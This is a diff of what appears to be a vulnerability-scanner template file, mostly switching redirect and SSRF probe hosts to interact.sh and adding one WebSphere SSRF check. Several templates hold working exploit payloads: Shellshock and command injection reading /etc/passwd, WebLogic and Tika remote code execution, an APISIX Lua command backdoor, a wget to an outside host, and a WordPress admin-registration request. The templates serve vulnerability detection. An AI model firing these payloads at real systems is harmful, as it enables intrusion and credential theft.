@@ -546,8 +546,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/awstats/awredir.pl?url=example.com",
-            "{{BaseURL}}/cgi-bin/awstats/awredir.pl?url=example.com"
+            "{{BaseURL}}/awstats/awredir.pl?url=interact.sh",
+            "{{BaseURL}}/cgi-bin/awstats/awredir.pl?url=interact.sh"
           ]
         }
       ]
@@ -2774,7 +2774,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.action?redirect:http://www.example.com/"
+            "{{BaseURL}}/index.action?redirect:http://www.interact.sh/"
           ]
         }
       ]
@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3517,7 +3517,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://example.com/"
+            "{{BaseURL}}/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://interact.sh/"
           ]
         }
       ]
@@ -3843,7 +3843,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/novius-os/admin/nos/login?redirect=http://example.com"
+            "{{BaseURL}}/novius-os/admin/nos/login?redirect=http://interact.sh"
           ]
         }
       ]
@@ -3858,7 +3858,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Fexample.com"
+            "{{BaseURL}}/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Finteract.sh"
           ]
         }
       ]
@@ -4024,7 +4024,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/CMSPages/GetDocLink.ashx?link=https://example.com/"
+            "{{BaseURL}}/CMSPages/GetDocLink.ashx?link=https://interact.sh/"
           ]
         }
       ]
@@ -4691,7 +4691,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/login?redir=http://www.example.com"
+            "{{BaseURL}}/login?redir=http://www.interact.sh"
           ]
         }
       ]
@@ -4918,7 +4918,7 @@
       "requests": [
         {
           "raw": [
-            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>example.com</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n",
+            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>interact.sh</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n",
             "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <soapenv:Header>\n          <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n              <java>\n                  <void class=\"java.lang.Thread\" method=\"currentThread\">\n                      <void method=\"getCurrentWork\">\n                          <void method=\"getResponse\">\n                              <void method=\"getServletOutputStream\">\n                                  <void method=\"flush\"/>\n                              </void>\n                              <void method=\"getWriter\"><void method=\"write\"><string>{{randstr}}</string></void></void>\n                          </void>\n                      </void>\n                  </void>\n              </java>\n          </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n</soapenv:Envelope>\n"
           ]
         }
@@ -4994,7 +4994,7 @@
         {
           "raw": [
             "POST /user.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuname={{username}}&pass={{password}}&xoops_redirect=%2Findex.php&op=login\n",
-            "GET /modules/profile/index.php?op=main&xoops_redirect=https:www.attacker.com HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /modules/profile/index.php?op=main&xoops_redirect=https:www.interact.sh HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -5481,7 +5481,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/OA_HTML/cabo/jsps/a.jsp?_t=fredRC&configName=&redirect=%2f%5cexample.com"
+            "{{BaseURL}}/OA_HTML/cabo/jsps/a.jsp?_t=fredRC&configName=&redirect=%2f%5cinteract.sh"
           ]
         }
       ]
@@ -5496,7 +5496,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/OA_HTML/cabo/jsps/a.jsp?_t=fredRC&configName=&redirect=%2f%5cexample.com"
+            "{{BaseURL}}/OA_HTML/cabo/jsps/a.jsp?_t=fredRC&configName=&redirect=%2f%5cinteract.sh"
           ]
         }
       ]
@@ -6165,7 +6165,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}//example.com"
+            "{{BaseURL}}//interact.sh"
           ]
         }
       ]
@@ -6255,7 +6255,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/echo-server.html?code=test&state=http://www.attacker.com#"
+            "{{BaseURL}}/echo-server.html?code=test&state=http://www.interact.sh#"
           ]
         }
       ]
@@ -6300,7 +6300,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/web/cgi-bin/hi3510/param.cgi?cmd=setmobilesnapattr&cururl=http%3A%2F%2Fattacker.com"
+            "{{BaseURL}}/web/cgi-bin/hi3510/param.cgi?cmd=setmobilesnapattr&cururl=http%3A%2F%2Finteract.sh"
           ]
         }
       ]
@@ -6360,11 +6360,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -6459,8 +6459,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/login?next=http://attacker.com/?app.scan/",
-            "{{BaseURL}}/signup?next=http://attacker.com/?app.scan/"
+            "{{BaseURL}}/login?next=http://interact.sh/?app.scan/",
+            "{{BaseURL}}/signup?next=http://interact.sh/?app.scan/"
           ]
         }
       ]
@@ -6475,7 +6475,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}//www.example.com"
+            "{{BaseURL}}//www.interact.sh"
           ]
         }
       ]
@@ -6536,7 +6536,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/IntellectMain.jsp?IntellectSystem=https://www.example.com"
+            "{{BaseURL}}/IntellectMain.jsp?IntellectSystem=https://www.interact.sh"
           ]
         }
       ]
@@ -6807,8 +6807,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/select_project.php?url=http://attacker.com",
-            "{{BaseURL}}/clock_status.php?current_page=http://attacker.com"
+            "{{BaseURL}}/select_project.php?url=http://interact.sh",
+            "{{BaseURL}}/clock_status.php?current_page=http://interact.sh"
           ]
         }
       ]
@@ -6881,8 +6881,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://www.example.com",
-            "{{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=example.com"
+            "{{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://www.interact.sh",
+            "{{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=interact.sh"
           ]
         }
       ]
@@ -7271,7 +7271,7 @@
       },
       "requests": [
         {
-          "body": "<!DOCTYPE root PUBLIC \"-//B/A/EN\" \"http://example.com\">",
+          "body": "<!DOCTYPE root PUBLIC \"-//B/A/EN\" \"http://interact.sh\">",
           "method": "POST",
           "path": [
             "{{BaseURL}}/OA_HTML/lcmServiceController.jsp"
@@ -7435,8 +7435,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/redirector.php?url=https://attacker.com",
-            "{{BaseURL}}/redirector.php?do=nodelay&url=https://attacker.com"
+            "{{BaseURL}}/redirector.php?url=https://interact.sh",
+            "{{BaseURL}}/redirector.php?do=nodelay&url=https://interact.sh"
           ]
         }
       ]
@@ -7859,7 +7859,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/modules/babel/redirect.php?newurl=http://example.com"
+            "{{BaseURL}}/modules/babel/redirect.php?newurl=http://interact.sh"
           ]
         }
       ]
@@ -8239,7 +8239,7 @@
       },
       "requests": [
         {
-          "body": "success=%2Fshare%2Fpage%2F&failure=:\\\\example.com&username=baduser&password=badpass\n",
+          "body": "success=%2Fshare%2Fpage%2F&failure=:\\\\interact.sh&username=baduser&password=badpass\n",
           "headers": {
             "Content-Type": "application/x-www-form-urlencoded"
           },
@@ -8424,7 +8424,7 @@
       },
       "requests": [
         {
-          "body": "{\"username\": \"testpoc\", \"has_admin_role\": true, \"password\": \"TestPoc!\", \"email\": \"testpoc@example.com\", \"realname\": \"poc\"}\n",
+          "body": "{\"username\": \"testpoc\", \"has_admin_role\": true, \"password\": \"TestPoc!\", \"email\": \"testpoc@interact.sh\", \"realname\": \"poc\"}\n",
           "headers": {
             "Content-Type": "application/json"
           },
@@ -9196,7 +9196,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/labkey/__r1/login-login.view?returnUrl=http://example.com"
+            "{{BaseURL}}/labkey/__r1/login-login.view?returnUrl=http://interact.sh"
           ]
         }
       ]
@@ -9382,7 +9382,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/updating.jsp?url=https://example.com/"
+            "{{BaseURL}}/updating.jsp?url=https://interact.sh/"
           ]
         }
       ]
@@ -9495,8 +9495,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -9773,8 +9773,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?redirect=/\\/evil.com/",
-            "{{BaseURL}}/index.php?redirect=//evil.com"
+            "{{BaseURL}}/index.php?redirect=/\\/interact.sh/",
+            "{{BaseURL}}/index.php?redirect=//interact.sh"
           ]
         }
       ]
@@ -9818,7 +9818,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/%252f%255cexample.com%252fa%253fb/"
+            "{{BaseURL}}/%252f%255cinteract.sh%252fa%253fb/"
           ]
         }
       ]
@@ -10179,7 +10179,7 @@
       "requests": [
         {
           "raw": [
-            "POST /apisix/admin/routes HTTP/1.1\nHost: {{Hostname}}\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\nContent-Type: application/json\n\n{\n  \"uri\":\"/{{randstr}}\",\n  \"script\":\"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f =        assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n  \"upstream\":{\n    \"type\":\"roundrobin\",\n    \"nodes\":{\n      \"example.com:80\":1\n    }\n  }\n}\n",
+            "POST /apisix/admin/routes HTTP/1.1\nHost: {{Hostname}}\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\nContent-Type: application/json\n\n{\n  \"uri\":\"/{{randstr}}\",\n  \"script\":\"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f =        assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n  \"upstream\":{\n    \"type\":\"roundrobin\",\n    \"nodes\":{\n      \"interact.sh:80\":1\n    }\n  }\n}\n",
             "GET /{{randstr}}?cmd=id HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
@@ -10609,7 +10609,7 @@
         {
           "raw": [
             "POST /zb_system/cmd.php?act=verify HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 81\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nbtnPost=Log+In&username={{username}}&password={{md5(\"{{password}}\")}}&savedate=0\n",
-            "GET /zb_system/cmd.php?atc=login&redirect=http://www.example.com HTTP/2\nHost: {{Hostname}}\n"
+            "GET /zb_system/cmd.php?atc=login&redirect=http://www.interact.sh HTTP/2\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -10791,8 +10791,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10827,7 +10827,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/email_passthrough.php?email_ID=1&type=link&email_key=5QImTaEHxmAzNYyYvENAtYHsFu7fyotR&redirect_to=http%3A%2F%2Fexample.com"
+            "{{BaseURL}}/email_passthrough.php?email_ID=1&type=link&email_key=5QImTaEHxmAzNYyYvENAtYHsFu7fyotR&redirect_to=http%3A%2F%2Finteract.sh"
           ]
         }
       ]
@@ -10842,7 +10842,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?url=http://example.com"
+            "{{BaseURL}}/?url=http://interact.sh"
           ]
         }
       ]
@@ -10978,7 +10978,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://example.com"
+            "{{BaseURL}}/find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://interact.sh"
           ]
         }
       ]
@@ -11639,7 +11639,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
+            "{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://interact.sh%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
           ]
         }
       ]
@@ -11892,7 +11892,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/backend/admin/common/clearcache?previousUrl=http://www.example.com"
+            "{{BaseURL}}/backend/admin/common/clearcache?previousUrl=http://www.interact.sh"
           ]
         }
       ]
@@ -13001,7 +13001,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/adminer?elastic=example.com&username="
+            "{{BaseURL}}/adminer?elastic=interact.sh&username="
           ]
         }
       ]
@@ -13030,7 +13030,7 @@
       "requests": [
         {
           "raw": [
-            "POST /wp-json/buddypress/v1/signup HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"user_login\":\"{{randstr}}\",\n  \"password\":\"{{randstr}}\",\n  \"user_name\":\"{{randstr}}\",\n  \"user_email\":\"{{randstr}}@example.com\"\n}\n"
+            "POST /wp-json/buddypress/v1/signup HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"user_login\":\"{{randstr}}\",\n  \"password\":\"{{randstr}}\",\n  \"user_name\":\"{{randstr}}\",\n  \"user_email\":\"{{randstr}}@interact.sh\"\n}\n"
           ]
         }
       ]
@@ -13075,7 +13075,7 @@
       "requests": [
         {
           "raw": [
-            "GET /goform/goform_get_cmd_process?cmd=psw_fail_num_str HTTP/1.1\nHost: {{Hostname}}\nReferer: http://evil.com/127.0.0.1.html\n"
+            "GET /goform/goform_get_cmd_process?cmd=psw_fail_num_str HTTP/1.1\nHost: {{Hostname}}\nReferer: http://interact.sh/127.0.0.1.html\n"
           ]
         }
       ]
@@ -13350,12 +13350,12 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/ads/www/delivery/lg.php?dest=http://example.com",
-            "{{BaseURL}}/adserve/www/delivery/lg.php?dest=http://example.com",
-            "{{BaseURL}}/adserver/www/delivery/lg.php?dest=http://example.com",
-            "{{BaseURL}}/openx/www/delivery/lg.php?dest=http://example.com",
-            "{{BaseURL}}/revive/www/delivery/lg.php?dest=http://example.com",
-            "{{BaseURL}}/www/delivery/lg.php?dest=http://example.com"
+            "{{BaseURL}}/ads/www/delivery/lg.php?dest=http://interact.sh",
+            "{{BaseURL}}/adserve/www/delivery/lg.php?dest=http://interact.sh",
+            "{{BaseURL}}/adserver/www/delivery/lg.php?dest=http://interact.sh",
+            "{{BaseURL}}/openx/www/delivery/lg.php?dest=http://interact.sh",
+            "{{BaseURL}}/revive/www/delivery/lg.php?dest=http://interact.sh",
+            "{{BaseURL}}/www/delivery/lg.php?dest=http://interact.sh"
           ]
         }
       ]
@@ -13430,7 +13430,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Fexample.com"
+            "{{BaseURL}}/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Finteract.sh"
           ]
         }
       ]
@@ -13582,7 +13582,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://example.com&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym"
+            "{{BaseURL}}/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://interact.sh&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym"
           ]
         }
       ]
@@ -13716,7 +13716,7 @@
         {
           "raw": [
             "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\n",
-            "GET /wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}} HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /wp-login.php?action=theplusrp&key=&redirecturl=http://interact.sh&forgoturl=http://interact.sh&login={{username}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -13775,7 +13775,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/community/?foro=signin&redirect_to=https://example.com/"
+            "{{BaseURL}}/community/?foro=signin&redirect_to=https://interact.sh/"
           ]
         }
       ]
@@ -13939,7 +13939,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://example.com"
+            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh"
           ]
         }
       ]
@@ -14043,7 +14043,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://example.com"
+            "{{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh"
           ]
         }
       ]
@@ -14058,7 +14058,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?noptin_ns=email_click&to=https://example.com"
+            "{{BaseURL}}/?noptin_ns=email_click&to=https://interact.sh"
           ]
         }
       ]
@@ -14118,7 +14118,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://example.com"
+            "{{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://interact.sh"
           ]
         }
       ]
@@ -14149,7 +14149,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-admin/admin-ajax.php?action=heartbeat&admin_custom_language_toggle=1&admin_custom_language_return_url=https://example.com"
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=heartbeat&admin_custom_language_toggle=1&admin_custom_language_return_url=https://interact.sh"
           ]
         }
       ]
@@ -14414,7 +14414,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0"
+            "{{BaseURL}}/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0"
           ]
         }
       ]
@@ -14509,6 +14509,22 @@
       ]
     },
     {
+      "id": "CVE-2021-27748",
+      "info": {
+        "name": "IBM WebSphere Portal SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/docpicker/internal_proxy/http/interact.sh",
+            "{{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/interact.sh"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-27850",
       "info": {
         "name": "Apache Tapestry - Remote Code Execution",
@@ -14533,7 +14549,7 @@
         {
           "raw": [
             "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
-            "GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://example.com HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n"
+            "GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n"
           ]
         }
       ]
@@ -14809,7 +14825,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/new/newhttp://example.com"
+            "{{BaseURL}}/new/newhttp://interact.sh"
           ]
         }
       ]
@@ -15203,7 +15219,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/login?next=\\\\\\example.com"
+            "{{BaseURL}}/login?next=\\\\\\interact.sh"
           ]
         }
       ]
@@ -15403,7 +15419,7 @@
       "requests": [
         {
           "raw": [
-            "GET /\\u001B]8;;https://example.com\"/onmouseover=\"alert(1)\\u0007example\\u001B]8;;\\u0007 HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n\n"
+            "GET /\\u001B]8;;https://interact.sh\"/onmouseover=\"alert(1)\\u0007example\\u001B]8;;\\u0007 HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n\n"
           ]
         }
       ]
@@ -15463,7 +15479,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://example.com/"
+            "{{BaseURL}}/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://interact.sh/"
           ]
         }
       ]
@@ -15508,8 +15524,8 @@
       "requests": [
         {
           "raw": [
-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{randstr}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"_wp_http_referer\"\n\n/wp/?page_id=18\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"pp_current_url\"\n\n{{BaseURL}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_form_id\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_referrer_page\"\n\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"melange_id\"\n\n\n-----------------------------138742543134772812001999326589--\n",
-            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\nlog={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{randstr}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@interact.sh\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{randstr}}@interact.sh\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{randstr}}@interact.sh\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{randstr}}@interact.sh\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"_wp_http_referer\"\n\n/wp/?page_id=18\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"pp_current_url\"\n\n{{BaseURL}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_form_id\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_referrer_page\"\n\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"melange_id\"\n\n\n-----------------------------138742543134772812001999326589--\n",
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\nlog={{randstr}}@interact.sh&pwd={{randstr}}@interact.sh&wp-submit=Log+In\n",
             "GET /wp-admin/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n"
           ]
         }
@@ -15693,7 +15709,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}//example.com/%2f.."
+            "{{BaseURL}}//interact.sh/%2f.."
           ]
         }
       ]
@@ -16060,7 +16076,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?m=user&c=Users&a=logout&referurl=https://example.com"
+            "{{BaseURL}}/index.php?m=user&c=Users&a=logout&referurl=https://interact.sh"
           ]
         }
       ]
@@ -16482,7 +16498,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/auth/logout?continue=//example.com"
+            "{{BaseURL}}/auth/logout?continue=//interact.sh"
           ]
         }
       ]
@@ -16888,7 +16904,7 @@
       "requests": [
